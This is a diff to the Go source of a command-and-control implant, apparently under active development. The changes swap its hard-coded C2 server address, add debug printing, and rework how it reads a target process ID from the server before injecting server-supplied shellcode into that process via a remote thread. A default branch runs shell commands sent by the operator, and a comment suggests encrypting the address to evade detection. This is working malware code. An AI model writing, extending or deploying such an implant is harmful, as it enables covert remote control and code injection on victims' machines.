@@ -1,11 +1,12 @@
 package main
 
 import (
-	"encoding/binary"
+	//"encoding/binary"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
+	"strconv"
 	"syscall"
 	"time"
 
@@ -173,7 +174,7 @@ func getSC(conn *net.Conn) ([]byte, int) {
 }
 
 func main() {
-	c2Address := "192.168.0.106:9003" //Have it encrypted or anything and decode it during runtime
+	c2Address := "192.168.5.138:6969" //Have it encrypted or anything and decode it during runtime
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -223,18 +224,21 @@ func main() {
 			{
 				buffer := make([]byte, 100)
 				sc, err := getSC(&conn)
+				fmt.Println(sc)
 				if err == -1 {
 					continue
 				}
 				read_len, er := conn.Read(buffer)
 				if er != nil {
-					fmt.Println("Problem Reading the buffer")
+					fmt.Println("Problem Reading into the buffer")
 					conn.Write([]byte("Return"))
 					continue
 				}
 				bufferSnapped := buffer[:read_len]
-				pid := binary.LittleEndian.Uint32(bufferSnapped)
-				remoteThread(sc, pid)
+				conn.Write([]byte("OK\n"))
+				pidString := string(bufferSnapped)
+				pidInt, _ := strconv.Atoi(pidString)
+				remoteThread(sc, pidInt)
 			}
 		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
